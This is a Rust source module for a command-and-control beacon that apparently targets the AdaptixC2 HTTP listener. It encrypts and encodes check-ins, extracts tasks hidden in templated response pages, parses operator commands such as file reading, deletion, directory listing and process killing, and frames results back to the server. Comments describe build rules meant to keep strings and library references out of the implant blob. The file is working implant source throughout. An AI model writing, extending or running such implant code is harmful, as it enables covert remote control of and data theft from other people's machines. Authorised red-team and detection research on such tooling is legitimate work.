//! HTTP transport shaping for the AdaptixC2 `BeaconHTTP` listener (v1.2,
//! docs/WIRE.md): the pure halves of the transaction — the RC4+base64 beat
//! envelope of the request header, the page-template payload extraction and
//! task-pack parsing of the response, and the framed task-result body.
//!
//! Pinned against the server source (`beacon_listener_http/pl_transport.go`,
//! `beacon_agent/pl_main.go`/`pl_packer.go`, tag v1.2) by tests replaying
//! vectors produced by the exact Go semantics (crypto/rc4, base64, PackArray,
//! PackTasks). The WinHTTP glue that carries these bytes lives in the beacon
//! crate (`runtime::winhttp`); everything here is pure and bounded.

use crate::beat::BeatData;
use crate::rc4::Rc4;
use crate::wire::{Reader, Writer};

/// Standard base64 alphabet (Go `base64.StdEncoding`), with padding.
/// A runtime literal declared in the anti-strings manifest.
const B64: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/// Base64 (std, padded) encode into `dst`; `None` if it does not fit.
pub fn base64_encode(src: &[u8], dst: &mut [u8]) -> Option<usize> {
    let need = src.len().div_ceil(3) * 4;
    if dst.len() < need {
        return None;
    }
    let mut si = 0usize;
    let mut di = 0usize;
    while si + 3 <= src.len() {
        let n = ((src[si] as u32) << 16) | ((src[si + 1] as u32) << 8) | src[si + 2] as u32;
        dst[di] = B64[(n >> 18) as usize & 63];
        dst[di + 1] = B64[(n >> 12) as usize & 63];
        dst[di + 2] = B64[(n >> 6) as usize & 63];
        dst[di + 3] = B64[n as usize & 63];
        si += 3;
        di += 4;
    }
    let rem = src.len() - si;
    if rem == 1 {
        let n = (src[si] as u32) << 16;
        dst[di] = B64[(n >> 18) as usize & 63];
        dst[di + 1] = B64[(n >> 12) as usize & 63];
        dst[di + 2] = b'=';
        dst[di + 3] = b'=';
        di += 4;
    } else if rem == 2 {
        let n = ((src[si] as u32) << 16) | ((src[si + 1] as u32) << 8);
        dst[di] = B64[(n >> 18) as usize & 63];
        dst[di + 1] = B64[(n >> 12) as usize & 63];
        dst[di + 2] = B64[(n >> 6) as usize & 63];
        dst[di + 3] = b'=';
        di += 4;
    }
    Some(di)
}

/// Build the beat header value (listener `hb_header`):
/// `base64( RC4(listener_key, u32 BE watermark || u32 BE agent_id || beat) )`.
///
/// `scratch` holds the plaintext envelope during the call (must fit
/// `8 + beat size`); returns the encoded length in `out`.
pub fn beat_header(
    beat: &BeatData,
    listener_key: &[u8],
    watermark: u32,
    agent_id: u32,
    scratch: &mut [u8],
    out: &mut [u8],
) -> Option<usize> {
    let mut w = Writer::new(scratch);
    if !w.u32(watermark) || !w.u32(agent_id) || !crate::beat::write_beat(&mut w, beat) {
        return None;
    }
    let len = w.written();
    Rc4::new(listener_key).crypt_in_place(&mut scratch[..len]);
    base64_encode(&scratch[..len], out)
}

/// Byte range of the encrypted payload inside a response page (see
/// `extract_payload`); the range form lets the caller decrypt in place.
///
/// Manual comparisons (never `starts_with`/`ends_with`: they lower to a
/// `memcmp` reference, and one reference pulls the whole LTO-fused
/// compiler_builtins object into the blob — the same rule as manual copies).
pub fn extract_payload_range(page: &[u8], prepend: &[u8], append: &[u8]) -> Option<(usize, usize)> {
    if page.len() < prepend.len() + append.len() {
        return None;
    }
    let mut i = 0usize;
    while i < prepend.len() {
        if page[i] != prepend[i] {
            return None;
        }
        i += 1;
    }
    let mut i = 0usize;
    while i < append.len() {
        if page[page.len() - append.len() + i] != append[i] {
            return None;
        }
        i += 1;
    }
    Some((prepend.len(), page.len() - append.len()))
}

/// Extract the encrypted task payload from a response page: the listener
/// substitutes `<<<PAYLOAD_DATA>>>` inside its `page-payload` template, so
/// the page is exactly `prepend || payload || append`. Empty payload = no
/// tasks hosted.
pub fn extract_payload<'a>(page: &'a [u8], prepend: &[u8], append: &[u8]) -> Option<&'a [u8]> {
    let (start, end) = extract_payload_range(page, prepend, append)?;
    Some(&page[start..end])
}

/// Server task pack command ids (native `beacon_agent`, pl_utils.go).
pub const COMMAND_TERMINATE: u32 = 10;
pub const COMMAND_PROFILE: u32 = 21;
pub const COMMAND_PWD: u32 = 4;
pub const COMMAND_CD: u32 = 8;
pub const COMMAND_LS: u32 = 14;
pub const COMMAND_CAT: u32 = 24;
pub const COMMAND_MKDIR: u32 = 27;
pub const COMMAND_RM: u32 = 17;
pub const COMMAND_COPY: u32 = 12;
pub const COMMAND_MV: u32 = 18;
pub const COMMAND_GETUID: u32 = 22;
pub const COMMAND_DISKS: u32 = 15;
pub const COMMAND_PS_LIST: u32 = 41;
pub const COMMAND_PS_KILL: u32 = 42;
/// Beacon-side error report: `{COMMAND_ERROR, win32 error code}`.
pub const COMMAND_ERROR: u32 = 0x1111_FFFF;

/// Longest path the beacon carries (MAX_PATH); one buffer per task.
pub const PATH_CAP: usize = 260;

/// A parsed server task (the commands the beacon can delimit and execute;
/// anything else in the pack stops the parse — the server keeps unprocessed
/// tasks hosted and resends them).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Task {
    /// `COMMAND_PROFILE` subop 1: sleep seconds + jitter percent.
    Sleep { sec: u32, jitter_pct: u32 },
    /// `COMMAND_TERMINATE`: silent exit.
    Terminate,
    /// `COMMAND_PWD`: current working directory.
    Pwd,
    /// `COMMAND_CD` with the target path (ACP bytes).
    Cd { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_LS` with the directory to list.
    Ls { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_CAT` with the file to read.
    Cat { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_MKDIR` with the directory to create.
    Mkdir { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_RM` with the file or directory to delete.
    Rm { path_len: u16, path: [u8; PATH_CAP] },
    /// `COMMAND_COPY` with source and destination.
    Cp {
        src_len: u16,
        src: [u8; PATH_CAP],
        dst_len: u16,
        dst: [u8; PATH_CAP],
    },
    /// `COMMAND_MV` with source and destination.
    Mv {
        src_len: u16,
        src: [u8; PATH_CAP],
        dst_len: u16,
        dst: [u8; PATH_CAP],
    },
    /// `COMMAND_GETUID`: the current token's identity.
    Getuid,
    /// `COMMAND_DISKS`: the mounted drives.
    Disks,
    /// `COMMAND_PS_LIST`: the process listing.
    PsList,
    /// `COMMAND_PS_KILL` with the target pid.
    PsKill { pid: u32 },
}

impl Task {
    /// The primary path argument of any path-carrying task (for Cp/Mv:
    /// the source).
    pub fn path(&self) -> &[u8] {
        match self {
            Task::Cd { path_len, path }
            | Task::Ls { path_len, path }
            | Task::Cat { path_len, path }
            | Task::Mkdir { path_len, path }
            | Task::Rm { path_len, path } => &path[..*path_len as usize],
            Task::Cp { src_len, src, .. } | Task::Mv { src_len, src, .. } => {
                &src[..*src_len as usize]
            }
            _ => &[],
        }
    }

    /// The destination of Cp/Mv (empty elsewhere).
    pub fn dst(&self) -> &[u8] {
        match self {
            Task::Cp { dst_len, dst, .. } | Task::Mv { dst_len, dst, .. } => {
                &dst[..*dst_len as usize]
            }
            _ => &[],
        }
    }
}

/// PackArray string argument: `u32 LE length (incl. the NUL) || bytes ||
/// NUL` (the task-arg encoding — not the BE array wire form).
fn pack_string(r: &mut Reader) -> Option<(u16, [u8; PATH_CAP])> {
    let len = r.u32_le()? as usize;
    if len == 0 || len > PATH_CAP {
        return None;
    }
    let bytes = r.take(len)?;
    let mut buf = [0u8; PATH_CAP];
    let mut i = 0;
    while i < bytes.len() {
        buf[i] = bytes[i];
        i += 1;
    }
    // Trailing NUL is separator, not data.
    let mut n = bytes.len();
    while n > 0 && buf[n - 1] == 0 {
        n -= 1;
    }
    Some((n as u16, buf))
}

/// Parse one task record `[u32 LE commandId || args || u32 LE taskId]`.
/// `None` = unknown command or truncated record.
pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
    let command = r.u32_le()?;
    let task = match command {
        COMMAND_PROFILE => {
            // Same PackArray layout the server's CreateCommand emits for
            // "sleep": {COMMAND_PROFILE, 1, sleepTime, jitterTime}.
            let subop = r.u32_le()?;
            if subop != 1 {
                return None;
            }
            let sec = r.u32_le()?;
            let jitter_pct = r.u32_le()?;
            Task::Sleep { sec, jitter_pct }
        }
        // COMMAND_TERMINATE carries the exit method (1 = kill thread,
        // 2 = kill process) before the task id.
        COMMAND_TERMINATE => {
            let _exit_method = r.u32_le()?;
            Task::Terminate
        }
        COMMAND_PWD => Task::Pwd,
        COMMAND_CD => {
            let (path_len, path) = pack_string(r)?;
            Task::Cd { path_len, path }
        }
        COMMAND_LS => {
            let (path_len, path) = pack_string(r)?;
            Task::Ls { path_len, path }
        }
        COMMAND_CAT => {
            let (path_len, path) = pack_string(r)?;
            Task::Cat { path_len, path }
        }
        COMMAND_MKDIR => {
            let (path_len, path) = pack_string(r)?;
            Task::Mkdir { path_len, path }
        }
        COMMAND_RM => {
            let (path_len, path) = pack_string(r)?;
            Task::Rm { path_len, path }
        }
        COMMAND_COPY | COMMAND_MV => {
            let (src_len, src) = pack_string(r)?;
            let (dst_len, dst) = pack_string(r)?;
            if command == COMMAND_COPY {
                Task::Cp {
                    src_len,
                    src,
                    dst_len,
                    dst,
                }
            } else {
                Task::Mv {
                    src_len,
                    src,
                    dst_len,
                    dst,
                }
            }
        }
        COMMAND_GETUID => Task::Getuid,
        COMMAND_DISKS => Task::Disks,
        COMMAND_PS_LIST => Task::PsList,
        COMMAND_PS_KILL => {
            let pid = r.u32_le()?;
            Task::PsKill { pid }
        }
        _ => return None,
    };
    let id = r.u32_le()?;
    Some((task, id))
}

/// Begin a results pack: reserve the `u32 BE size` the server's ProcessData
/// checks (`size - 4 == remaining`).
pub fn begin_results(w: &mut Writer) -> bool {
    w.u32(0)
}

/// Backfill the reserved size (`4 + body`).
pub fn finish_results(w: &mut Writer) -> bool {
    if w.written() < 4 {
        return false;
    }
    let total = w.written() as u32;
    w.backfill_u32_be(0, total);
    true
}

/// MKDIR result: `array path` (the created directory).
pub fn push_mkdir_result(w: &mut Writer, task_id: u32, path: &[u8]) -> bool {
    push_result_header(w, task_id, COMMAND_MKDIR) && w.array(path)
}

/// RM result: `byte 0` (file deleted) or `byte 1` (directory removed).
pub fn push_rm_result(w: &mut Writer, task_id: u32, was_dir: bool) -> bool {
    push_result_header(w, task_id, COMMAND_RM) && w.u8(u8::from(was_dir))
}

/// CP/MV result: the header alone — the server renders the fixed message.
pub fn push_plain_result(w: &mut Writer, task_id: u32, command_id: u32) -> bool {
    push_result_header(w, task_id, command_id)
}

/// GETUID result: `byte elevated || array domain || array username` —
/// the server renders `You are 'DOMAIN\user'` (plus `(elevated)`).
pub fn push_getuid_result(
    w: &mut Writer,
    task_id: u32,
    elevated: bool,
    domain: &[u8],
    username: &[u8],
) -> bool {
    push_result_header(w, task_id, COMMAND_GETUID)
        && w.u8(u8::from(elevated))
        && w.array(domain)
        && w.array(username)
}

/// DISKS result header: `byte 1 || int count`, entries follow.
pub fn push_disks_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
    push_result_header(w, task_id, COMMAND_DISKS) && w.u8(1) && w.u32(count)
}

/// One DISKS entry: `byte driveLetter || int driveType` (2 USB, 3 disk,
/// 4 network, 5 CD-ROM).
pub fn push_disks_entry(w: &mut Writer, letter: u8, drive_type: u32) -> bool {
    w.u8(letter) && w.u32(drive_type)
}

/// PS_LIST result header: `byte 1 || int count`, entries follow.
pub fn push_ps_list_header(w: &mut Writer, task_id: u32, count: u32) -> bool {
    push_result_header(w, task_id, COMMAND_PS_LIST) && w.u8(1) && w.u32(count)
}

/// One PS_LIST entry (words are the native 16-bit truncation of pids).
pub struct PsEntry<'a> {
    pub pid: u32,
    pub ppid: u32,
    pub session: u32,
    /// 0 x32, 1 x64, anything else unknown.
    pub arch: u8,
    pub elevated: bool,
    pub domain: &'a [u8],
    pub username: &'a [u8],
    pub name: &'a [u8],
}

/// `word pid || word ppid || word session || byte arch || byte elevated
/// || array domain || array username || array processName`.
pub fn push_ps_entry(w: &mut Writer, e: &PsEntry) -> bool {
    w.u16(e.pid as u16)
        && w.u16(e.ppid as u16)
        && w.u16(e.session as u16)
        && w.u8(e.arch)
        && w.u8(u8::from(e.elevated))
        && w.array(e.domain)
        && w.array(e.username)
        && w.array(e.name)
}

/// PS_KILL result: `int pid` — the server renders `Process %d killed`.
pub fn push_ps_kill_result(w: &mut Writer, task_id: u32, pid: u32) -> bool {
    push_result_header(w, task_id, COMMAND_PS_KILL) && w.u32(pid)
}

/// Result record header: `u32 BE taskId || u32 BE commandId`.
pub fn push_result_header(w: &mut Writer, task_id: u32, command_id: u32) -> bool {
    w.u32(task_id) && w.u32(command_id)
}

/// Win32 failure report: `COMMAND_ERROR || u32 BE errorCode` — the server
/// renders `Error [code]: <message>`.
pub fn push_error_result(w: &mut Writer, task_id: u32, error_code: u32) -> bool {
    push_result_header(w, task_id, COMMAND_ERROR) && w.u32(error_code)
}

/// PWD/CD result: `array path` (the new/current working directory).
pub fn push_path_result(w: &mut Writer, task_id: u32, command_id: u32, path: &[u8]) -> bool {
    push_result_header(w, task_id, command_id) && w.array(path)
}

/// CAT result: `array path || array content`.
pub fn push_cat_result(w: &mut Writer, task_id: u32, path: &[u8], content: &[u8]) -> bool {
    push_result_header(w, task_id, COMMAND_CAT) && w.array(path) && w.array(content)
}

/// LS result header: `byte 1 || array rootPath || int count` — the entries
/// follow as `push_ls_entry` records.
pub fn push_ls_result_header(w: &mut Writer, task_id: u32, root: &[u8], count: u32) -> bool {
    push_result_header(w, task_id, COMMAND_LS) && w.u8(1) && w.array(root) && w.u32(count)
}

/// One LS entry: `byte isDir || long size || int unixDate || array name`.
pub fn push_ls_entry(w: &mut Writer, is_dir: bool, size: u64, date: u32, name: &[u8]) -> bool {
    w.u8(u8::from(is_dir)) && w.u64(size) && w.u32(date) && w.array(name)
}

/// Append the sleep-acknowledgement record the server's ProcessData expects
/// for COMMAND_PROFILE: `u32 BE taskId || u32 BE 21 || u32 BE 1 || sec || jitter`.
pub fn push_sleep_result(w: &mut Writer, task_id: u32, sec: u32, jitter_pct: u32) -> bool {
    w.u32(task_id) && w.u32(COMMAND_PROFILE) && w.u32(1) && w.u32(sec) && w.u32(jitter_pct)
}

/// Wrap the packed results in the server's body frame
/// (`flags:0 || u32 LE origLen || data` — `decompressZlibData` passes the
/// payload through uncompressed when the flag is clear). `out` must fit
/// `5 + packed.len()`; the caller RC4-encrypts `out` with the session key.
pub fn wrap_results_frame(packed: &[u8], out: &mut [u8]) -> Option<usize> {
    if out.len() < 5 + packed.len() {
        return None;
    }
    out[0] = 0;
    // Manual copies (copy_from_slice lowers to memcpy — the
    // compiler_builtins rule: no reference may leave the blob code).
    let len = packed.len() as u32;
    let le = len.to_le_bytes();
    let mut i = 0;
    while i < 4 {
        out[1 + i] = le[i];
        i += 1;
    }
    let mut i = 0;
    while i < packed.len() {
        out[5 + i] = packed[i];
        i += 1;
    }
    Some(5 + packed.len())
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::beat::BeatData;
    use std::vec::Vec;

    fn test_beat<'a>() -> BeatData<'a> {
        BeatData {
            sleep_sec: 60,
            jitter_pct: 10,
            killdate: 1_767_225_600,
            workingtime: 0,
            acp: 1252,
            oemcp: 437,
            gmt_offset: 2,
            pid: 0x1234,
            tid: 0x5678,
            build_number: 26100,
            major: 10,
            minor: 0,
            internal_ip: 0x0A00_020F,
            flags: 0b11,
            session_key: &[0x42u8; 32],
            domain: b"MEGACORP",
            computer: b"WIN-TEST",
            username: b"nariod",
            process: b"testhost.exe",
        }
    }

    fn hex(s: &str) -> Vec<u8> {
        (0..s.len() / 2)
            .map(|i| u8::from_str_radix(&s[2 * i..2 * i + 2], 16).unwrap())
            .collect()
    }

    /// RFC 4648 vectors (exactly Go's base64.StdEncoding, padding included).
    #[test]
    fn base64_rfc4648() {
        for (plain, enc) in [
            ("", ""),
            ("f", "Zg=="),
            ("fo", "Zm8="),
            ("foo", "Zm9v"),
            ("foob", "Zm9vYg=="),
            ("fooba", "Zm9vYmE="),
            ("foobar", "Zm9vYmFy"),
        ] {
            let mut out = [0u8; 16];
            let n = base64_encode(plain.as_bytes(), &mut out).unwrap();
            assert_eq!(&out[..n], enc.as_bytes(), "plain={plain:?}");
        }
    }

    #[test]
    fn base64_rejects_small_buffer() {
        let mut out = [0u8; 3];
        assert!(base64_encode(b"foobar", &mut out).is_none());
    }

    /// Full beat envelope, byte-pinned against the Go reference generator
    /// (crypto/rc4 + base64.StdEncoding, listener framing wm||id||beat).
    #[test]
    fn beat_header_matches_go_reference() {
        const GO_B64: &str = "sqA+2JlPpyMG25f6Dt0qRbokOF/yt0Lui3qkbPsl11QjOkt6xAniEoFVMtiyTflKxdcRzHdzsIul3kXhS4VpJME3ITl2pKpY/PBDAJmojku8ckBnBn+VpBpu6yAfzyDjRo+pEJ/JYks11us8fFcvG3BFl0UX1KVvqlxGDyhZ87xlng==";
        let mut scratch = [0u8; 512];
        let mut out = [0u8; 720];
        let n = beat_header(
            &test_beat(),
            &[0u8, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15],
            0x5b3c_7e21,
            0xdead_beef,
            &mut scratch,
            &mut out,
        )
        .unwrap();
        assert_eq!(&out[..n], GO_B64.as_bytes());
    }

    #[test]
    fn beat_header_rejects_small_scratch() {
        let mut scratch = [0u8; 16];
        let mut out = [0u8; 720];
        assert!(beat_header(&test_beat(), &[1u8; 16], 1, 2, &mut scratch, &mut out).is_none());
    }

    /// Response page: extract, session-decrypt, parse the task pack — the
    /// exact bytes the Go generator built through PackTasks.
    #[test]
    fn task_pack_from_go_reference() {
        const PREPEND: &[u8] = b"{\"result\":\"";
        const APPEND: &[u8] = b"\"}";
        let page =
            hex("7b22726573756c74223a22017f56c8611e546fb87839e4a822504871342c64a66f29cb227d");

        let payload = extract_payload(&page, PREPEND, APPEND).unwrap();
        let mut decrypted = payload.to_vec();
        Rc4::new(&[0x42u8; 32]).crypt_in_place(&mut decrypted);

        // PackTasks trailer: u32 LE total size, then [data || u32 LE taskId].
        let mut r = Reader::new(&decrypted);
        let total = r.u32_le().unwrap() as usize;
        assert_eq!(total, 20, "pack = 16 bytes data + 4 bytes taskId");
        assert!(total <= r.remaining());

        let (task, id) = parse_task(&mut r).unwrap();
        assert_eq!(
            task,
            Task::Sleep {
                sec: 60,
                jitter_pct: 10
            }
        );
        assert_eq!(id, 0x1122_3344);
        assert_eq!(r.remaining(), decrypted.len() - 4 - total);
    }

    #[test]
    fn empty_payload_is_no_tasks() {
        let page = b"{\"result\":\"\"}";
        let payload = extract_payload(page, b"{\"result\":\"", b"\"}").unwrap();
        assert!(payload.is_empty());
    }

    #[test]
    fn payload_extraction_rejects_foreign_pages() {
        assert!(extract_payload(b"other page", b"{\"result\":\"", b"\"}").is_none());
        assert!(extract_payload(b"{\"result\":\"", b"{\"result\":\"", b"\"}").is_none());
    }

    #[test]
    fn parse_task_terminate() {
        // COMMAND_TERMINATE (10), exit method 1 (kill thread), taskId 1 —
        // the layout the server's CreateCommand emits for "terminate thread".
        let bytes = [10u8, 0, 0, 0, 1, 0, 0, 0, 1, 0, 0, 0];
        let mut r = Reader::new(&bytes);
        assert_eq!(parse_task(&mut r), Some((Task::Terminate, 1)));
        assert_eq!(r.remaining(), 0);
    }

    /// File-command task records, byte-pinned against the Go reference
    /// (PackArray semantics: int u32 LE, string u32 LE len-incl-NUL).
    #[test]
    fn parse_task_file_commands_from_go_reference() {
        // cd "C:\Test", taskId 0x11223344.
        let cd = hex("0800000008000000433a5c546573740044332211");
        let mut r = Reader::new(&cd);
        let (task, id) = parse_task(&mut r).unwrap();
        assert!(matches!(task, Task::Cd { path_len: 7, .. }));
        assert_eq!(task.path(), b"C:\\Test");
        assert_eq!(id, 0x1122_3344);
        assert_eq!(r.remaining(), 0);

        // pwd, taskId 1.
        let pwd = hex("0400000001000000");
        let mut r = Reader::new(&pwd);
        assert_eq!(parse_task(&mut r), Some((Task::Pwd, 1)));
        assert_eq!(r.remaining(), 0);

        // cat "C:\flag.txt", taskId 7.
        let cat = hex("180000000c000000433a5c666c61672e7478740007000000");
        let mut r = Reader::new(&cat);
        let (task, id) = parse_task(&mut r).unwrap();
        assert!(matches!(task, Task::Cat { path_len: 11, .. }));
        assert_eq!(task.path(), b"C:\\flag.txt");
        assert_eq!(id, 7);
        assert_eq!(r.remaining(), 0);
    }

    /// Result records the server's ProcessData parses (BE arrays/ints).
    #[test]
    fn result_records_match_native_processdata_layout() {
        // pwd result: taskId 1 || COMMAND_PWD || array "C:\Test".
        let mut buf = [0u8; 64];
        let mut w = Writer::new(&mut buf);
        assert!(push_path_result(&mut w, 1, COMMAND_PWD, b"C:\\Test"));
        let expected = hex("000000010000000400000007433a5c54657374");
        assert_eq!(&w.written_bytes()[..expected.len()], &expected[..]);

        // error result: taskId 2 || COMMAND_ERROR || code 5 (access denied).
        let mut ebuf = [0u8; 64];
        let mut w = Writer::new(&mut ebuf);
        assert!(push_error_result(&mut w, 2, 5));
        let expected = hex("000000021111ffff00000005");
        assert_eq!(&w.written_bytes()[..expected.len()], &expected[..]);

        // ls result: taskId 3 || COMMAND_LS || 1 || array root || count 1
        // || entry(dir, 0, 42, "tmp").
        let mut lbuf = [0u8; 128];
        let mut w = Writer::new(&mut lbuf);
        assert!(push_ls_result_header(&mut w, 3, b"C:\\t", 1));
        assert!(push_ls_entry(&mut w, true, 0, 42, b"tmp"));
        let expected =
            hex("000000030000000e0100000004433a5c74000000010100000000000000000000002a00000003");
        let got = w.written_bytes();
        // The prefix pins the layout up to the entry name.
        assert_eq!(&got[..expected.len()], &expected[..]);
        assert_eq!(&got[expected.len()..expected.len() + 3], b"tmp");
        assert_eq!(got.len(), expected.len() + 3);
    }

    /// Every path-carrying variant must expose its argument — a variant
    /// missing from `path()`/`dst()` silently produces empty API calls
    /// (caught first against the live server: `Directory '' created`).
    #[test]
    fn task_path_accessors_cover_every_variant() {
        let mk = |bytes: &[u8]| {
            let mut buf = [0u8; PATH_CAP];
            buf[..bytes.len()].copy_from_slice(bytes);
            (bytes.len() as u16, buf)
        };
        let (l, p) = mk(b"C:\\dir");
        let (sl, sd) = mk(b"C:\\src.txt");
        let (dl, dd) = mk(b"C:\\dst.txt");

        let cases = [
            (
                Task::Cd {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Ls {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Cat {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Mkdir {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Rm {
                    path_len: l,
                    path: p,
                },
                b"C:\\dir".as_slice(),
            ),
            (
                Task::Cp {
                    src_len: sl,
                    src: sd,
                    dst_len: dl,
                    dst: dd,
                },
                b"C:\\src.txt".as_slice(),
            ),
            (
                Task::Mv {
                    src_len: sl,
                    src: sd,
                    dst_len: dl,
                    dst: dd,
                },
                b"C:\\src.txt".as_slice(),
            ),
        ];
        for (task, want) in cases {
            assert_eq!(task.path(), want, "path() of {task:?}");
        }
        assert_eq!(
            Task::Cp {
                src_len: sl,
                src: sd,
                dst_len: dl,
                dst: dd
            }
            .dst(),
            b"C:\\dst.txt".as_slice()
        );
        assert_eq!(
            Task::Mv {
                src_len: sl,
                src: sd,
                dst_len: dl,
                dst: dd
            }
            .dst(),
            b"C:\\dst.txt".as_slice()
        );
    }

    #[test]
    fn parse_task_rejects_unknown_command() {
        let bytes = [99u8, 0, 0, 0, 1, 0, 0, 0];
        let mut r = Reader::new(&bytes);
        assert!(parse_task(&mut r).is_none());
    }

    /// Results body, byte-pinned against the Go generator: the framed pack
    /// (u32 BE size || record) inside the 5-byte listener frame, before RC4.
    #[test]
    fn results_body_matches_go_reference() {
        const GO_FRAME_HEX: &str = "0018000000000000181122334400000015000000010000003c0000000a";
        let mut buf = [0u8; 64];
        let mut w = Writer::new(&mut buf);
        assert!(begin_results(&mut w));
        assert!(push_sleep_result(&mut w, 0x1122_3344, 60, 10));
        assert!(finish_results(&mut w));
        let packed = w.written_bytes().to_vec();

        let mut framed = [0u8; 64];
        let n = wrap_results_frame(&packed, &mut framed).unwrap();
        assert_eq!(&framed[..n], &hex(GO_FRAME_HEX)[..]);
    }

    /// End-to-end symmetry with the Go server: our results body decrypts to
    /// what the generator's frame decrypts to.
    #[test]
    fn results_frame_round_trips_go_reference() {
        const GO_RESULTS_HEX: &str = "156756c8741e546fa1691bd7d02250486e342c64e35c0bda5ad57c8882";
        let go_body = hex(GO_RESULTS_HEX);
        let mut decrypted = go_body.clone();
        Rc4::new(&[0x42u8; 32]).crypt_in_place(&mut decrypted);

        // Server frame: flags 0, u32 LE origLen.
        assert_eq!(decrypted[0], 0);
        let orig_len =
            u32::from_le_bytes([decrypted[1], decrypted[2], decrypted[3], decrypted[4]]) as usize;
        assert_eq!(orig_len, decrypted.len() - 5);
        let mut r = Reader::new(&decrypted[5..]);
        let size = r.u32().unwrap();
        assert_eq!(size as usize, 4 + 20);
        let task_id = r.u32().unwrap();
        let command = r.u32().unwrap();
        let subop = r.u32().unwrap();
        let sec = r.u32().unwrap();
        let jitter = r.u32().unwrap();
        assert_eq!(task_id, 0x1122_3344);
        assert_eq!(command, COMMAND_PROFILE);
        assert_eq!(subop, 1);
        assert_eq!(sec, 60);
        assert_eq!(jitter, 10);
        assert_eq!(r.remaining(), 0);
    }
}
